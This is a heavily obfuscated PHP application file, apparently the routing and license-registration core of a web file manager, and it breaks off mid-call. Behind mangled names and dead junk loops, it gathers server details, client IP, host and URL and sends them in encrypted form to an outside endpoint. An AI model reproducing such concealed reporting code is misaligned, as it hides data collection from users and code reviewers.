<?php
 goto Ağßâ„§ãİ; bŠö«ù¬©¥: while ($paxzefhobw < $_SERVER[ÅÄÇĞô][688]) { if ($paxzefhobw >= 0) { break; } $paxzefhobw++; } class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\156\x64\x65\x78"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($ıª§…ÒÖ) { $íÌÅ°ËÍ =& $_SERVER[ÅÄÇĞô]; $ú˜¼¡Åæ =& $_SERVER[¥Ö¼Ø±–]; $Ø§ÚÃÒÉ = explode($ú˜¼¡Åæ[0], trim($ıª§…ÒÖ, $ú˜¼¡Åæ[0])); $this->defaultModule = $Ø§ÚÃÒÉ[0] ? $Ø§ÚÃÒÉ[0] : $this->defaultModule; $this->defaultController = $Ø§ÚÃÒÉ[1] ? $Ø§ÚÃÒÉ[1] : $this->defaultController; $œğéì±Î = $íÌÅ°ËÍ[692]; if (strlen($œğéì±Î) < $íÌÅ°ËÍ[693]) { return; } $this->defaultAction = $Ø§ÚÃÒÉ[2] ? $Ø§ÚÃÒÉ[2] : $this->defaultAction; $this->lkgub6b7d451($ú˜¼¡Åæ[1], array($this, $ú˜¼¡Åæ[2])); $ÁÒ¸üñÂ = $íÌÅ°ËÍ[694]; if (!$ÁÒ¸üñÂ) { die; } } public function appRun($ÔÜéĞË) { $ÒÍ´ãäŞ =& $_SERVER[ÅÄÇĞô]; $Ÿ¥“³É§ =& $_SERVER[¥Ö¼Ø±–]; $Ä¬ºÒ’¶ = explode($Ÿ¥“³É§[0], $ÔÜéĞË); $Ò†¬î¸¶ = $ÒÍ´ãäŞ[695]; if (!$Ò†¬î¸¶) { return; } $î §æÛ¨ = strtolower($Ä¬ºÒ’¶[0]); $ÜÒÌç˜¿ = $Ÿ¥“³É§[3]; if ($î §æÛ¨ == $Ÿ¥“³É§[4]) { $ÜÒÌç˜¿ = $Ÿ¥“³É§[5]; $Ä¬ºÒ’¶[0] = $Ÿ¥“³É§[6]; $Ä¬ºÒ’¶[1] = $Ä¬ºÒ’¶[1] . $Ÿ¥“³É§[7]; $ÔÜéĞË = join($Ÿ¥“³É§[0], $Ä¬ºÒ’¶); $ÔÜéĞË = trim($ÔÜéĞË, $Ÿ¥“³É§[0]); } call_user_func(array($Ÿ¥“³É§[8], $Ÿ¥“³É§[9]), $ÜÒÌç˜¿ . $Ÿ¥“³É§[10], $ÔÜéĞË); ActionCall($ÔÜéĞË); call_user_func(array($Ÿ¥“³É§[8], $Ÿ¥“³É§[9]), $ÜÒÌç˜¿ . $Ÿ¥“³É§[11], $ÔÜéĞË); $ïŒ”²‰Ì = $ÒÍ´ãäŞ[696]; if (!$ïŒ”²‰Ì) { return; } } private function autorun() { $ã¶ğ¶×ß =& $_SERVER[ÅÄÇĞô]; $Ÿ¾à¨œŠ =& $_SERVER[¥Ö¼Ø±–]; global $config; $†ÙÎ°‘ = $ã¶ğ¶×ß[697]; if (!$†ÙÎ°‘) { die; } if (count($config[$Ÿ¾à¨œŠ[12]]) == 0) { return; } foreach ($config[$Ÿ¾à¨œŠ[12]] as $ÊÇªø›Ê => $÷ÑËî™) { $this->appRun($÷ÑËî™); $·¤ê¸‡Â = $ã¶ğ¶×ß[698]; while (strlen($·¤ê¸‡Â) < $ã¶ğ¶×ß[699]) { if (!$·¤ê¸‡Â) { break; } $·¤ê¸‡Â++; } } } private function uaiq282936f9() { $±¥¢«¹« =& $_SERVER[ÅÄÇĞô]; $Àøƒ¨ÛŠ =& $_SERVER[¥Ö¼Ø±–]; $½ÍŸ¾õµ = $Àøƒ¨ÛŠ[4]; $¾öÂîû· = $±¥¢«¹«[700]; if (strlen($¾öÂîû·) < $±¥¢«¹«[701]) { die; } $Œõõá¬¥ = $GLOBALS[$Àøƒ¨ÛŠ[13]][$Àøƒ¨ÛŠ[14]][0]; $¯¢·æÊ = $±¥¢«¹«[702]; if (!$¯¢·æÊ) { return; } if (!$Œõõá¬¥ || strlen($Œõõá¬¥) <= strlen($½ÍŸ¾õµ)) { return; } if (strtolower(substr($Œõõá¬¥, -strlen($½ÍŸ¾õµ))) != $½ÍŸ¾õµ) { return; } $ö¾üÑõ· = substr($Œõõá¬¥, 0, -strlen($½ÍŸ¾õµ)); $óğ¥Œğ… = array($Àøƒ¨ÛŠ[4], $ö¾üÑõ·); $şËÍ¸» = $±¥¢«¹«[703]; while (strlen($şËÍ¸») < $±¥¢«¹«[704]) { if (!$şËÍ¸») { break; } $şËÍ¸»++; } $ë‹·Â—… = array_slice($GLOBALS[$Àøƒ¨ÛŠ[13]][$Àøƒ¨ÛŠ[14]], 1); $GLOBALS[$Àøƒ¨ÛŠ[13]][$Àøƒ¨ÛŠ[14]] = array_merge($óğ¥Œğ…, $ë‹·Â—…); $øŒú–¦ = $±¥¢«¹«[705]; $GLOBALS[$Àøƒ¨ÛŠ[13]][$Àøƒ¨ÛŠ[15]] = implode($Àøƒ¨ÛŠ[0], $GLOBALS[$Àøƒ¨ÛŠ[13]][$Àøƒ¨ÛŠ[14]]); $“æï§’ó = $±¥¢«¹«[706]; if (!$“æï§’ó) { return; } } private function kbzv48a9cdef() { $™°›»Ğ =& $_SERVER[ÅÄÇĞô]; $Ë‰¢¶øŠ =& $_SERVER[¥Ö¼Ø±–]; if ($GLOBALS[$Ë‰¢¶øŠ[13]][$Ë‰¢¶øŠ[15]] != $Ë‰¢¶øŠ[6]) { return; } $äãØĞí = $_SERVER[$Ë‰¢¶øŠ[16]]; $ÏòÜÓöë = $™°›»Ğ[707]; $ÌØŸ = $Ë‰¢¶øŠ[17]; $È”€ñó– = $™°›»Ğ[708]; if (!$È”€ñó–) { return; } if (!strstr($äãØĞí, $ÌØŸ)) { return; } $óÛóªã³ = strrpos($äãØĞí, $ÌØŸ); $İÇÇÍÉ = substr($äãØĞí, $óÛóªã³ + strlen($ÌØŸ)); preg_match_all($Ë‰¢¶øŠ[18], $İÇÇÍÉ, $ØÒ¥ÁâÕ); $ºÍ·å‹ = $™°›»Ğ[709]; if (!$ºÍ·å‹) { die; } $İÇÇÍÉ = trim($ØÒ¥ÁâÕ[0][0], $Ë‰¢¶øŠ[19]); $õÂ„÷äÊ = $™°›»Ğ[710]; $GLOBALS[$Ë‰¢¶øŠ[13]][$Ë‰¢¶øŠ[14]] = explode($Ë‰¢¶øŠ[19], $İÇÇÍÉ); $GLOBALS[$Ë‰¢¶øŠ[13]][$Ë‰¢¶øŠ[15]] = implode($Ë‰¢¶øŠ[0], $GLOBALS[$Ë‰¢¶øŠ[13]][$Ë‰¢¶øŠ[14]]); } public function run() { $ŞË¹®€ =& $_SERVER[ÅÄÇĞô]; $‡¿…‡ñå =& $_SERVER[¥Ö¼Ø±–]; $this->kbzv48a9cdef(); $ªô¬óÖ« = $ŞË¹®€[711]; $this->uaiq282936f9(); $³À«—Ú½ = $GLOBALS[$‡¿…‡ñå[13]][$‡¿…‡ñå[14]]; $ì½˜Ï©½ = $ŞË¹®€[712]; $éÉ…—Üì = $GLOBALS[$‡¿…‡ñå[13]][$‡¿…‡ñå[15]]; $Øî„ç¢° = $ŞË¹®€[713]; if (strlen($Øî„ç¢°) < $ŞË¹®€[704]) { die; } define($‡¿…‡ñå[20], isset($³À«—Ú½[0]) && $³À«—Ú½[0] ? $³À«—Ú½[0] : $this->defaultModule); define($‡¿…‡ñå[21], isset($³À«—Ú½[1]) && $³À«—Ú½[0] ? $³À«—Ú½[1] : $this->defaultController); $°´ÜĞ¢‡ = $ŞË¹®€[714]; if (!$°´ÜĞ¢‡) { die; } define($‡¿…‡ñå[22], isset($³À«—Ú½[2]) && $³À«—Ú½[0] ? $³À«—Ú½[2] : $this->defaultAction); $‰¼éªöŒ = $ŞË¹®€[715]; if (!$‰¼éªöŒ) { die; } define($‡¿…‡ñå[23], MOD . $‡¿…‡ñå[0] . ST . $‡¿…‡ñå[0] . ACT); $_SERVER[$‡¿…‡ñå[24]] = strtolower(ACTION); $³£İ´åï = $ŞË¹®€[716]; while (strlen($³£İ´åï) < $ŞË¹®€[693]) { if (!$³£İ´åï) { break; } $³£İ´åï++; } $this->autorun(); $”“ Å˜÷ = $ŞË¹®€[717]; if (count($³À«—Ú½) >= 3) { $this->appRun($éÉ…—Üì); } else { $this->appRun(ACTION); } } private $ylkd975f0a6c = array(); private $jzky0a451a52 = ''; public function cdhi20b29271() { $ÏÀôú =& $_SERVER[ÅÄÇĞô]; $å°ü€„ =& $_SERVER[¥Ö¼Ø±–]; $this->odcr83ce6d03(); $‹ÈÁåÆË = $ÏÀôú[718]; if (strlen($‹ÈÁåÆË) < $ÏÀôú[688]) { die; } $this->oitj52484150(); $this->oubz4f7a09c0(); $õ“ïïèö = $ÏÀôú[719]; if (strlen($õ“ïïèö) < $ÏÀôú[693]) { die; } $this->gcym35f781e5(); $this->jgkm6e37bf27(); $ÍÊıõùõ = $ÏÀôú[720]; if (strlen($ÍÊıõùõ) < $ÏÀôú[688]) { die; } $this->dhuv6065e7e1(); $this->zrwc78a076e7(); $this->lkgub6b7d451($å°ü€„[25], array($this, $å°ü€„[26])); $ÉÔÜï±Ñ = $ÏÀôú[721]; if (!$ÉÔÜï±Ñ) { die; } $this->lkgub6b7d451($å°ü€„[27], array($this, $å°ü€„[28])); $‡ğöŒë• = $ÏÀôú[722]; if (!$‡ğöŒë•) { return; } $this->lkgub6b7d451($å°ü€„[29], array($this, $å°ü€„[30])); $this->lkgub6b7d451($å°ü€„[31], array($this, $å°ü€„[32])); } public function cxdub0568805($ì»Î¡Ó‡) { $Ğî”Ş°û =& $_SERVER[ÅÄÇĞô]; $‰Ñäê¥Â =& $_SERVER[¥Ö¼Ø±–]; $®·“—ïË = Model($‰Ñäê¥Â[33])->get(); $İ˜èöä = array($‰Ñäê¥Â[34], $‰Ñäê¥Â[35], $‰Ñäê¥Â[36], $‰Ñäê¥Â[37], $‰Ñäê¥Â[38], $‰Ñäê¥Â[39], $‰Ñäê¥Â[40], $‰Ñäê¥Â[41], $‰Ñäê¥Â[42], $‰Ñäê¥Â[43], $‰Ñäê¥Â[44], $‰Ñäê¥Â[45], $‰Ñäê¥Â[46], $‰Ñäê¥Â[47], $‰Ñäê¥Â[48], $‰Ñäê¥Â[49], $‰Ñäê¥Â[50], $‰Ñäê¥Â[51], $‰Ñäê¥Â[52], $‰Ñäê¥Â[53], $‰Ñäê¥Â[54], $‰Ñäê¥Â[55], $‰Ñäê¥Â[56], $‰Ñäê¥Â[57], $‰Ñäê¥Â[58], $‰Ñäê¥Â[59], $‰Ñäê¥Â[60], $‰Ñäê¥Â[61], $‰Ñäê¥Â[62], $‰Ñäê¥Â[63], $‰Ñäê¥Â[64], $‰Ñäê¥Â[65], $‰Ñäê¥Â[66], $‰Ñäê¥Â[67], $‰Ñäê¥Â[68], $‰Ñäê¥Â[69], $‰Ñäê¥Â[70], $‰Ñäê¥Â[71], $‰Ñäê¥Â[72], $‰Ñäê¥Â[73], $‰Ñäê¥Â[74], $‰Ñäê¥Â[75], $‰Ñäê¥Â[76], $‰Ñäê¥Â[77], $‰Ñäê¥Â[78], $‰Ñäê¥Â[79], $‰Ñäê¥Â[80], $‰Ñäê¥Â[81], $‰Ñäê¥Â[82], $‰Ñäê¥Â[83], $‰Ñäê¥Â[84], $‰Ñäê¥Â[85]); foreach ($İ˜èöä as $ ÍËš£½) { $œéûòîã = $GLOBALS[$‰Ñäê¥Â[86]][$‰Ñäê¥Â[87]][$ ÍËš£½]; $»ì•“Í™ = $Ğî”Ş°û[723]; if (strlen($»ì•“Í™) < $Ğî”Ş°û[704]) { die; } if (isset($®·“—ïË[$ ÍËš£½])) { $œéûòîã = $®·“—ïË[$ ÍËš£½]; } $ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[89]][$ ÍËš£½] = $œéûòîã; } $Ä‰¬—Ã = $ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[89]][$‰Ñäê¥Â[46]]; $£Òáó€İ = $Ğî”Ş°û[724]; while ($£Òáó€İ < $Ğî”Ş°û[699]) { if ($£Òáó€İ >= 0) { break; } $£Òáó€İ++; } unset($ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[90]][$‰Ñäê¥Â[91]]); unset($ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[90]][$‰Ñäê¥Â[92]]); $ê‡§Š = $Ğî”Ş°û[725]; if (!$ê‡§Š) { die; } unset($ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[89]][$‰Ñäê¥Â[46]]); $†–îê›õ = $Ğî”Ş°û[726]; while ($†–îê›õ < $Ğî”Ş°û[688]) { if ($†–îê›õ >= 0) { break; } $†–îê›õ++; } unset($ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[89]][$‰Ñäê¥Â[93]]); $ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[89]][$‰Ñäê¥Â[94]] = array($‰Ñäê¥Â[95] => (int) $Ä‰¬—Ã[$‰Ñäê¥Â[96]], $‰Ñäê¥Â[97] => (int) _get($Ä‰¬—Ã, $‰Ñäê¥Â[98], 0)); $­²ô±µ¯ = substr(md5($‰Ñäê¥Â[99] . get_client_ip() . $®·“—ïË[$‰Ñäê¥Â[100]]), 0, 15); $˜†€Êû‰ = $Ğî”Ş°û[727]; while ($˜†€Êû‰ < $Ğî”Ş°û[693]) { if ($˜†€Êû‰ >= 0) { break; } $˜†€Êû‰++; } $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[102]] = Mcrypt::encode(Session::sign(), $­²ô±µ¯, 3600 * 24); $‹íáı—‡ = $Ğî”Ş°û[728]; if (strlen($‹íáı—‡) < $Ğî”Ş°û[699]) { die; } $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[103]] = Action($‰Ñäê¥Â[104])->accessToken(); $ä›¶ñ = $Ğî”Ş°û[729]; while (strlen($ä›¶ñ) < $Ğî”Ş°û[693]) { if (!$ä›¶ñ) { break; } $ä›¶ñ++; } $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[105]] = md5($_SERVER[$‰Ñäê¥Â[106]] . $®·“—ïË[$‰Ñäê¥Â[100]]); $·¬é¨ø¸ = $Ğî”Ş°û[730]; $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[107]] = base64_encode(serverInfo()); $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[108]] = $this->jzky0a451a52; $÷¢ïËçƒ = $Ğî”Ş°û[731]; if ($®·“—ïË[$‰Ñäê¥Â[108]] != $‰Ñäê¥Â[109]) { $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[110]] = $®·“—ïË[$‰Ñäê¥Â[110]]; $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[111]] = $®·“—ïË[$‰Ñäê¥Â[111]]; $†ñ˜¥€Á = rand_string(10) . $this->jzky0a451a52 . rand_string(5); $ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[112]][$‰Ñäê¥Â[113]] = $this->fvhk053f9048($†ñ˜¥€Á, $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[105]]); } if ($this->jzky0a451a52 == $‰Ñäê¥Â[109]) { $ì»Î¡Ó‡[$‰Ñäê¥Â[88]][$‰Ñäê¥Â[89]][$‰Ñäê¥Â[94]][$‰Ñäê¥Â[98]] = 0; } $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[114]] = $this->versionPluginFilter(); $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[115]] = _get($this->ylkd975f0a6c, $‰Ñäê¥Â[116], $‰Ñäê¥Â[6]); if (KodUser::isRoot() && $this->config[$‰Ñäê¥Â[117]]) { $ì»Î¡Ó‡[$‰Ñäê¥Â[101]][$‰Ñäê¥Â[118]] = WEB_ROOT; } return $ì»Î¡Ó‡; } private function dhuv6065e7e1() { $æñ»óó® =& $_SERVER[ÅÄÇĞô]; $†µß‹¡Ñ =& $_SERVER[¥Ö¼Ø±–]; $®¢´ÀÜ­ = $_SERVER[$†µß‹¡Ñ[24]] == $†µß‹¡Ñ[119]; if ($_SERVER[$†µß‹¡Ñ[24]] == $†µß‹¡Ñ[120] && $_GET[$†µß‹¡Ñ[121]] == $†µß‹¡Ñ[122]) { $®¢´ÀÜ­ = !0; } if ($®¢´ÀÜ­) { $û¤’Ãº = array($†µß‹¡Ñ[108] => $this->jzky0a451a52, $†µß‹¡Ñ[123] => $this->qyet9545d029(), $†µß‹¡Ñ[124] => Model($†µß‹¡Ñ[125])->count()); if ($this->jzky0a451a52 != $†µß‹¡Ñ[109]) { $ÅûÁÆÙ« = _get($this->ylkd975f0a6c, $†µß‹¡Ñ[126]); if ($ÅûÁÆÙ«) { $û¤’Ãº[$†µß‹¡Ñ[127]] = $ÅûÁÆÙ«; $û¤’Ãº[$†µß‹¡Ñ[128]] = strtotime(_get($this->ylkd975f0a6c, $†µß‹¡Ñ[129])); $û¤’Ãº[$†µß‹¡Ñ[130]] = _get($this->ylkd975f0a6c, $†µß‹¡Ñ[116]); } $§ş……Ì• = Model($†µß‹¡Ñ[33])->get($†µß‹¡Ñ[131], $†µß‹¡Ñ[6], !0); if (is_string($§ş……Ì•) && substr($§ş……Ì•, 0, 1) == $†µß‹¡Ñ[132]) { $§ş……Ì• = json_decode_force($§ş……Ì•); } if (is_array($§ş……Ì•) && $§ş……Ì•[$†µß‹¡Ñ[133]] && strstr($§ş……Ì•[$†µß‹¡Ñ[133]], $†µß‹¡Ñ[134])) { $í¨Èê€à = explode($†µß‹¡Ñ[134], $§ş……Ì•[$†µß‹¡Ñ[133]]); $û¤’Ãº[$†µß‹¡Ñ[135]] = $í¨Èê€à[0]; } } $û¤’Ãº = $this->csly3b9928b1(json_encode($û¤’Ãº), md5($†µß‹¡Ñ[136])); $ô¬ëî€Î = $æñ»óó®[732]; $Úñ¯À = array($†µß‹¡Ñ[137] => $û¤’Ãº); $íÙˆà = $æñ»óó®[733]; while ($íÙˆà < $æñ»óó®[688]) { if ($íÙˆà >= 0) { break; } $íÙˆà++; } call_user_func(array($†µß‹¡Ñ[138], $†µß‹¡Ñ[139]), $Úñ¯À); } if ($this->jzky0a451a52 == $†µß‹¡Ñ[109]) { return; } $Ê¬ßîÊ­ = array($†µß‹¡Ñ[140], $†µß‹¡Ñ[141], $†µß‹¡Ñ[142], $†µß‹¡Ñ[143], $†µß‹¡Ñ[144], $†µß‹¡Ñ[145]); $«²‹Ÿˆ  = Model($†µß‹¡Ñ[33])->get(); $Ú‚×Í…à = $æñ»óó®[734]; if (strlen($Ú‚×Í…à) < $æñ»óó®[699]) { die; } $Úñ¯À = array($†µß‹¡Ñ[146] => $«²‹Ÿˆ [$†µß‹¡Ñ[34]], $†µß‹¡Ñ[147] => $«²‹Ÿˆ [$†µß‹¡Ñ[35]], $†µß‹¡Ñ[148] => $†µß‹¡Ñ[6]); foreach ($Ê¬ßîÊ­ as $ó¿Å¯•â) { if (!isset($«²‹Ÿˆ [$ó¿Å¯•â]) || !$«²‹Ÿˆ [$ó¿Å¯•â]) { continue; } $Úñ¯À[$ó¿Å¯•â] = $«²‹Ÿˆ [$ó¿Å¯•â]; $¥Ò‡Ş¶Š = $æñ»óó®[735]; while (strlen($¥Ò‡Ş¶Š) < $æñ»óó®[701]) { if (!$¥Ò‡Ş¶Š) { break; } $¥Ò‡Ş¶Š++; } } call_user_func(array($†µß‹¡Ñ[138], $†µß‹¡Ñ[139]), $Úñ¯À); $™®õ´†ñ = $æñ»óó®[736]; while ($™®õ´†ñ < $æñ»óó®[693]) { if ($™®õ´†ñ >= 0) { break; } $™®õ´†ñ++; } } private function gcym35f781e5() { $Ş´ŸÕÄ¸ =& $_SERVER[ÅÄÇĞô]; $ÇÔ·â¤ú =& $_SERVER[¥Ö¼Ø±–]; if ($_SERVER[$ÇÔ·â¤ú[24]] != $ÇÔ·â¤ú[149]) { return; } if (!KodUser::isRoot()) { die; } $í¶àÛî° = $GLOBALS[$ÇÔ·â¤ú[13]]; if (isset($í¶àÛî°[$ÇÔ·â¤ú[150]])) { $this->vakr3838e560(); die; } if (isset($í¶àÛî°[$ÇÔ·â¤ú[151]]) && isset($í¶àÛî°[$ÇÔ·â¤ú[151]]) == $ÇÔ·â¤ú[122]) { $í¶àÛî°[$ÇÔ·â¤ú[152]] = Model($ÇÔ·â¤ú[33])->get($ÇÔ·â¤ú[153]); } if (!isset($í¶àÛî°[$ÇÔ·â¤ú[152]]) || strlen($í¶àÛî°[$ÇÔ·â¤ú[152]]) != 16) { show_json($ÇÔ·â¤ú[154] . $í¶àÛî°[$ÇÔ·â¤ú[152]], !1); } $Ë´æ˜ûÌ = Model($ÇÔ·â¤ú[33])->get($ÇÔ·â¤ú[100]); $¹¾Ô¡˜Á = md5($_SERVER[$ÇÔ·â¤ú[106]] . $Ë´æ˜ûÌ); $äıÃÀØ¥ = array($ÇÔ·â¤ú[152] => $í¶àÛî°[$ÇÔ·â¤ú[152]], $ÇÔ·â¤ú[155] => rand_string(16), $ÇÔ·â¤ú[156] => $ÇÔ·â¤ú[136], $ÇÔ·â¤ú[157] => $ÇÔ·â¤ú[158], $ÇÔ·â¤ú[159] => $_SERVER[$ÇÔ·â¤ú[160]], $ÇÔ·â¤ú[161] => $_SERVER[$ÇÔ·â¤ú[162]], $ÇÔ·â¤ú[163] => $_SERVER[$ÇÔ·â¤ú[164]], $ÇÔ·â¤ú[105] => $¹¾Ô¡˜Á, $ÇÔ·â¤ú[165] => Model($ÇÔ·â¤ú[33])->get($ÇÔ·â¤ú[131])); if (isset($í¶àÛî°[$ÇÔ·â¤ú[151]]) && isset($í¶àÛî°[$ÇÔ·â¤ú[151]]) == $ÇÔ·â¤ú[122]) { $äıÃÀØ¥[$ÇÔ·â¤ú[151]] = md5($äıÃÀØ¥[$ÇÔ·â¤ú[152]] . $ÇÔ·â¤ú[166] . $äıÃÀØ¥[$ÇÔ·â¤ú[155]]); } if ($í¶àÛî°[$ÇÔ·â¤ú[167]] == $ÇÔ·â¤ú[168]) { $Øî†ÕªÚ = $this->csly3b9928b1($¹¾Ô¡˜Á, $ÇÔ·â¤ú[169]); $àÁü©Ññ = $this->fvhk053f9048(json_encode($äıÃÀØ¥), $¹¾Ô¡˜Á . $ÇÔ·â¤ú[170], 3); $àÁü©Ññ = $àÁü©Ññ . $ÇÔ·â¤ú[171] . $_SERVER[$ÇÔ·â¤ú[160]]; $î¶Ë·ºŒ = $this->fgux34b5b356($ÇÔ·â¤ú[172] . $Øî†ÕªÚ . $ÇÔ·â¤ú[173] . $àÁü©Ññ, -1); show_json($î¶Ë·ºŒ, !0); } else { if ($í¶àÛî°[$ÇÔ·â¤ú[167]] == $ÇÔ·â¤ú[174]) { $å‰§­şÏ = substr(md5($ÇÔ·â¤ú[175] . $¹¾Ô¡˜Á), 12, 15) . $ÇÔ·â¤ú[176]; $àÁü©Ññ = $this->gbava37df45b(trim($í¶àÛî°[$ÇÔ·â¤ú[177]]), $å‰§­şÏ, 2); $şÁë½‘ë = json_decode($àÁü©Ññ, !0); if (!is_array($şÁë½‘ë) || !is_array($şÁë½‘ë[$ÇÔ·â¤ú[178]]) || $şÁë½‘ë[$ÇÔ·â¤ú[152]] != !0) { $ÊúÎ‹ëñ = $ÇÔ·â¤ú[179]; $Ï”Ğ¶ö¦ = $şÁë½‘ë[$ÇÔ·â¤ú[178]] ? $ÇÔ·â¤ú[180] . $şÁë½‘ë[$ÇÔ·â¤ú[178]] : $ÊúÎ‹ëñ; show_json($Ï”Ğ¶ö¦, !1); } else { $äıÃÀØ¥[$ÇÔ·â¤ú[155]] = $şÁë½‘ë[$ÇÔ·â¤ú[178]][$ÇÔ·â¤ú[181]]; } } else { $şÁë½‘ë = $this->fgux34b5b356($ÇÔ·â¤ú[182], $äıÃÀØ¥, 10); $È×¼ÅÂÌ = $Ş´ŸÕÄ¸[737]; } } if (!is_array($şÁë½‘ë) || !is_array($şÁë½‘ë[$ÇÔ·â¤ú[178]]) || $şÁë½‘ë[$ÇÔ·â¤ú[152]] != !0) { $ÊúÎ‹ëñ = LNG($ÇÔ·â¤ú[183]); $Ï”Ğ¶ö¦ = $şÁë½‘ë[$ÇÔ·â¤ú[178]] ? $ÇÔ·â¤ú[180] . $şÁë½‘ë[$ÇÔ·â¤ú[178]] : $ÊúÎ‹ëñ; show_json($Ï”Ğ¶ö¦, !1); } $ªÁõ¡Ï = $şÁë½‘ë[$ÇÔ·â¤ú[178]]; $ÈÔÖš¤Ş = $this->bwdu8302a14a($ªÁõ¡Ï[$ÇÔ·â¤ú[184]]); $ŞÄ¹ÈË = $Ş´ŸÕÄ¸[738]; if (!$ÈÔÖš¤Ş || $ÈÔÖš¤Ş != $ªÁõ¡Ï[$ÇÔ·â¤ú[129]]) { $€¿›ûãõ = array($ÇÔ·â¤ú[185] => Model($ÇÔ·â¤ú[33])->get($ÇÔ·â¤ú[100]), $ÇÔ·â¤ú[186] => $_SERVER[$ÇÔ·â¤ú[106]], $ÇÔ·â¤ú[187] => this_url(), $ÇÔ·â¤ú[161] => $_SERVER[$ÇÔ·â¤ú[162]]); $àÁü©Ññ = $this->imke14d59f87(json_encode($€¿›ûãõ)); $this->fgux34b5b356($ÇÔ·â¤ú[188] . $àÁü©Ññ); show_json(LNG($ÇÔ·â¤ú[189]), !0); } $¨Ÿôıù° = array($ÇÔ·â¤ú[153] => $ªÁõ¡Ï[$ÇÔ·â¤ú[190]], $ÇÔ·â¤ú[191] => $ªÁõ¡Ï[$ÇÔ·â¤ú[192]], $ÇÔ·â¤ú[193] => rand_string(16), $ÇÔ·â¤ú[108] => $ªÁõ¡Ï[$ÇÔ·â¤ú[194]]); if ($äıÃÀØ¥[$ÇÔ·â¤ú[155]]) { $¨Ÿôıù°[$ÇÔ·â¤ú[193]] = $äıÃÀØ¥[$ÇÔ·â¤ú[155]]; } $ù¬§¨ğô = substr(md5($¨Ÿôıù°[$ÇÔ·â¤ú[191]]), 10, 10); $Ü„—ˆ‚Â = $ù¬§¨ğô . $¨Ÿôıù°[$ÇÔ·â¤ú[108]] . $¨Ÿôıù°[$ÇÔ·â¤ú[193]]; $¨Ÿôıù°[$ÇÔ·â¤ú[110]] = strrev(base64_encode($this->csly3b9928b1($Ü„—ˆ‚Â, $ÇÔ·â¤ú[195]))); $±¹»­Û‰ = rand_string(16); $§µŠå²Û = $±¹»­Û‰ . $¨Ÿôıù°[$ÇÔ·â¤ú[108]] . $this->csly3b9928b1(md5($¨Ÿôıù°[$ÇÔ·â¤ú[153]]), $±¹»­Û‰); $¨Ÿôıù°[$ÇÔ·â¤ú[111]] = base64_encode(strrev($this->csly3b9928b1($§µŠå²Û, $ÇÔ·â¤ú[196]))); if ($ªÁõ¡Ï[$ÇÔ·â¤ú[197]] && $ªÁõ¡Ï[$ÇÔ·â¤ú[197]] >= 1) { Model($ÇÔ·â¤ú[33])->setDeep($ÇÔ·â¤ú[198], $ÇÔ·â¤ú[122]); } Model($ÇÔ·â¤ú[33])->set($¨Ÿôıù°); $Ø‹ôÊáÛ = md5($_SERVER[$ÇÔ·â¤ú[106]] . strrev($Ë´æ˜ûÌ) . $¨Ÿôıù°[$ÇÔ·â¤ú[191]]); $”†™í = strrev(substr($Ø‹ôÊáÛ, 10, 16)); $Áê§üı = $Ş´ŸÕÄ¸[739]; if (strlen($Áê§üı) < $Ş´ŸÕÄ¸[704]) { return; } $ÚÇà«¤ß = $this->fvhk053f9048(json_encode($ªÁõ¡Ï), $Ø‹ôÊáÛ); $Õ“é™  = array_to_keyvalue(Model($ÇÔ·â¤ú[7])->listData(), $ÇÔ·â¤ú[199]); $Ÿ°•ª¢¸ = $Ş´ŸÕÄ¸[740]; $ÏåØæ˜ƒ = $Õ“é™ [$ÇÔ·â¤ú[200]]; $¦œşÙÅê = array(); $ÊÓìŸè = $Ş´ŸÕÄ¸[741]; if (!$ÊÓìŸè) { die; } $¦œşÙÅê[$”†™í] = $ÚÇà«¤ß; $¶»›æÈ = $Ş´ŸÕÄ¸[742]; if (strlen($¶»›æÈ) < $Ş´ŸÕÄ¸[701]) { die; } Model($ÇÔ·â¤ú[7])->update($ÏåØæ˜ƒ[$ÇÔ·â¤ú[201]], array($ÇÔ·â¤ú[202] => $¦œşÙÅê)); $ÊÄøİ‰ = $Ş´ŸÕÄ¸[743]; while ($ÊÄøİ‰ < $Ş´ŸÕÄ¸[701]) { if ($ÊÄøİ‰ >= 0) { break; } $ÊÄøİ‰++; } $this->ylkd975f0a6c = $ªÁõ¡Ï; $ïù±ÙÏƒ = $Ş´ŸÕÄ¸[744]; if (strlen($ïù±ÙÏƒ) < $Ş´ŸÕÄ¸[688]) { die; } $this->jzky0a451a52 = $¨Ÿôıù°[$ÇÔ·â¤ú[108]]; $¨á÷€ø = $Ş´ŸÕÄ¸[745]; if (strlen($¨á÷€ø) < $Ş´ŸÕÄ¸[701]) { return; } $this->licenseRegistSuccess(); $Ê áĞ¥‹ = $Ş´ŸÕÄ¸[746]; Cache::set($ÇÔ·â¤ú[203] . md5($Ë´æ˜ûÌ . $ÇÔ·â¤ú[204]), $ÇÔ·â¤ú[6]); $ĞŠ—ì¬ë = $Ş´ŸÕÄ¸[747]; while ($ĞŠ—ì¬ë < $Ş´ŸÕÄ¸[688]) { if ($ĞŠ—ì¬ë >= 0) { break; } $ĞŠ—ì¬ë++; } show_json(LNG($ÇÔ·â¤ú[189]), 